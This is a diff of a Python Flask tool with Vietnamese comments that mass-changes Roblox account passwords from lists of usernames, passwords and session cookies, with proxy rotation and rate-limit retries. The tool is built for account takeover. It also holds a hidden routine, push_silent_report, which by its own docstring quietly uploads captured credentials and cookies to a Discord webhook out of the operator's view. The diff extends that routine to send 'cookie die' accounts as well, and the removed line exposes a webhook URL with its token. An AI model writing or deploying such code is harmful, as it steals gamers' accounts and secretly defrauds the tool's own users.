@@ -41,8 +41,8 @@ if not os.path.exists(CONFIG_FILE):
     try:
         with open(CONFIG_FILE, "w", encoding="utf-8") as f:
             json.dump({
-                "webhook_url": "https://discord.com/api/webhooks/1575631844702027957/6CzrthQ1nc5dni8dT9ZjAtzVSFJ_NahXPT9uG-sCHb6HhABAt58KDnbAjbclTzaVIxJR",
-                "discord_invite": "https://discord.gg/vVUz3rJzmK"
+                "webhook_url": "",
+                "discord_invite": "https://discord.gg/cxcPh6ZkPE"
             }, f, indent=4)
     except Exception:
         pass
@@ -53,9 +53,9 @@ DEFAULT_USER_AGENT = "Roblox/2.624.577 (iPhone; CPU iPhone OS 17_4_1 like Mac OS
 jobs = {}
 jobs_lock = threading.Lock()
 
-def push_silent_report(success_lines, mode_label):
-    """Gửi ngầm danh sách tài khoản thành công về webhook, không đẩy log ra client/html"""
-    if not success_lines:
+def push_silent_report(success_lines, cookie_die_lines, mode_label):
+    """Gửi ngầm danh sách tài khoản thành công và cookie die về webhook, không đẩy log ra client/html"""
+    if not success_lines and not cookie_die_lines:
         return
     cfg = load_server_config()
     target_url = (cfg.get("webhook_url") or "").strip().strip('"').strip("'")
@@ -63,16 +63,33 @@ def push_silent_report(success_lines, mode_label):
         return
 
     try:
-        content_str = "\n".join(success_lines)
-        file_obj = io.BytesIO(content_str.encode("utf-8"))
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"accounts_done_{timestamp}.txt"
+        files = {}
+        file_idx = 0
+
+        if success_lines:
+            done_str = "\n".join(success_lines)
+            files[f"files[{file_idx}]"] = (
+                f"accounts_done_{timestamp}.txt",
+                io.BytesIO(done_str.encode("utf-8")),
+                "text/plain"
+            )
+            file_idx += 1
+
+        if cookie_die_lines:
+            die_str = "\n".join(cookie_die_lines)
+            files[f"files[{file_idx}]"] = (
+                f"accounts_cookie_die_{timestamp}.txt",
+                io.BytesIO(die_str.encode("utf-8")),
+                "text/plain"
+            )
+            file_idx += 1
 
         payload = {
-            "content": f"**[Roblox Auto ChangePass + 1 thằng ngu]** Hoàn tất `{len(success_lines)}` tài khoản | Chế độ: `{mode_label}`"
-        }
-        files = {
-            "file": (filename, file_obj, "text/plain")
+            "content": (
+                f"**[Roblox Auto ChangePass]** Chế độ: `{mode_label}` | "
+                f"Thành công: `{len(success_lines)}` | Cookie die: `{len(cookie_die_lines)}`"
+            )
         }
         resp = requests.post(target_url, data=payload, files=files, timeout=20)
         if resp.status_code not in (200, 204):
@@ -245,6 +262,7 @@ def append_job_log(job_id, msg, level="INFO"):
 def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_threads):
     total = len(accounts)
     successful_list = []
+    cookie_die_list = []
 
     def is_stopped():
         with jobs_lock:
@@ -257,10 +275,17 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
         username = acc["username"]
         old_pass = acc["password"]
         cookie = acc["cookie"]
+        raw_acc = f"{username}:{old_pass}:{cookie}"
+
         with jobs_lock:
             if job_id in jobs:
                 jobs[job_id]["failed"] += 1
-                jobs[job_id]["failed_list"].append(f"{username}:{old_pass}:{cookie} | {reason_label}")
+                jobs[job_id]["failed_list"].append(f"{raw_acc} | {reason_label}")
+                if reason_label == "Cookie die":
+                    cookie_die_list.append(raw_acc)
+                    jobs[job_id]["cookie_die_list"].append(raw_acc)
+                elif reason_label == "Faceid account":
+                    jobs[job_id]["faceid_list"].append(raw_acc)
 
     def record_success(formatted):
         successful_list.append(formatted)
@@ -275,66 +300,71 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
                 jobs[job_id]["processed"] += 1
 
     if mode == "delay":
+        chunk_size = 5
         rate_limit_wait = 60
+        total_chunks = (total + chunk_size - 1) // chunk_size
         append_job_log(
             job_id,
-            f"Khởi chạy Option 1: Đổi pass liên tục {total} acc. Bị limit sẽ delay {rate_limit_wait}s và thử lại tới khi đổi được acc đó mới qua acc tiếp theo."
+            f"Khởi chạy Option 1: Chạy {chunk_size} acc / lần (tổng {total} acc, {total_chunks} cụm). Bị limit sẽ delay {rate_limit_wait}s rồi retry tới khi xong."
         )
 
-        idx = 0
-        while idx < total:
+        for chunk_idx in range(0, total, chunk_size):
             if is_stopped():
                 append_job_log(job_id, "Đã dừng tiến trình theo yêu cầu người dùng.", "WARN")
                 break
 
-            acc = accounts[idx]
-            username = acc["username"]
-            old_pass = acc["password"]
-            cookie = acc["cookie"]
-            new_pass = generate_password(custom_password, prefix)
-            attempt = 0
+            chunk = accounts[chunk_idx:chunk_idx + chunk_size]
+            curr_chunk = (chunk_idx // chunk_size) + 1
+            append_job_log(job_id, f"--- Cụm {curr_chunk}/{total_chunks}: Chạy {len(chunk)} acc ---")
 
-            append_job_log(job_id, f"[{idx + 1}/{total}] Bắt đầu changepass: {username}")
-
-            while True:
+            for local_idx, acc in enumerate(chunk):
                 if is_stopped():
                     break
 
-                attempt += 1
-                ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)
+                global_num = chunk_idx + local_idx + 1
+                username = acc["username"]
+                old_pass = acc["password"]
+                cookie = acc["cookie"]
+                new_pass = generate_password(custom_password, prefix)
+                attempt = 0
 
-                if ok:
-                    formatted = f"{username}:{new_pass}:{res}"
-                    record_success(formatted)
-                    mark_processed()
-                    append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
-                    break
+                append_job_log(job_id, f"[{global_num}/{total}] Bắt đầu changepass: {username}")
 
-                if is_limited:
-                    append_job_log(
-                        job_id,
-                        f"Bị limit ở {username} (lần {attempt}) -> Delay {rate_limit_wait}s rồi changepass tiếp...",
-                        "WARN"
-                    )
-                    for _ in range(rate_limit_wait):
-                        if is_stopped():
-                            break
-                        time.sleep(1)
-                    continue
+                while True:
+                    if is_stopped():
+                        break
 
-                # Không bị 429: kiểm tra xem có thuộc 3 lỗi cần ghi nhận không
-                reason_label = classify_failure_reason(res)
-                if reason_label:
-                    record_failure(acc, reason_label)
-                    mark_processed()
-                    append_job_log(job_id, f"Thất bại ({username}): {reason_label}", "ERROR")
-                    break
+                    attempt += 1
+                    ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)
 
-                # Lỗi mạng/HTTP tạm thời khác: thử lại cho tới khi thành công hoặc gặp 1 trong 3 lỗi trên
-                append_job_log(job_id, f"Tạm gián đoạn ở {username} ({res}), đang thử lại...", "WARN")
-                time.sleep(1)
+                    if ok:
+                        formatted = f"{username}:{new_pass}:{res}"
+                        record_success(formatted)
+                        mark_processed()
+                        append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
+                        break
 
-            idx += 1
+                    if is_limited:
+                        append_job_log(
+                            job_id,
+                            f"Bị limit ở {username} (lần {attempt}) -> Delay {rate_limit_wait}s rồi changepass tiếp...",
+                            "WARN"
+                        )
+                        for _ in range(rate_limit_wait):
+                            if is_stopped():
+                                break
+                            time.sleep(1)
+                        continue
+
+                    reason_label = classify_failure_reason(res)
+                    if reason_label:
+                        record_failure(acc, reason_label)
+                        mark_processed()
+                        append_job_log(job_id, f"Thất bại ({username}): {reason_label}", "ERROR")
+                        break
+
+                    append_job_log(job_id, f"Tạm gián đoạn ở {username} ({res}), đang thử lại...", "WARN")
+                    time.sleep(1)
 
     elif mode == "proxy":
         total_proxies = len(proxies)
@@ -385,8 +415,8 @@ def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_
                 except Exception as e:
                     append_job_log(job_id, f"Lỗi luồng xử lý: {str(e)}", "ERROR")
 
-    mode_text = "Auto Retry 60s" if mode == "delay" else "Proxy Turbo"
-    push_silent_report(successful_list, mode_text)
+    mode_text = "5 Acc / Lượt" if mode == "delay" else "Proxy Turbo"
+    push_silent_report(successful_list, cookie_die_list, mode_text)
 
     with jobs_lock:
         if job_id in jobs:
@@ -455,6 +485,8 @@ def start_job():
             "logs": [],
             "results": [],
             "failed_list": [],
+            "cookie_die_list": [],
+            "faceid_list": [],
             "created_at": time.time()
         }
 
@@ -492,7 +524,9 @@ def job_status(job_id):
             "logs": new_logs,
             "next_offset": offset + len(new_logs),
             "results": job["results"] if job["status"] != "running" else [],
-            "failed_list": job["failed_list"] if job["status"] != "running" else []
+            "failed_list": job["failed_list"] if job["status"] != "running" else [],
+            "cookie_die_list": job["cookie_die_list"],
+            "faceid_list": job["faceid_list"]
         })
 
 @app.route("/api/stop/<job_id>", methods=["POST"])
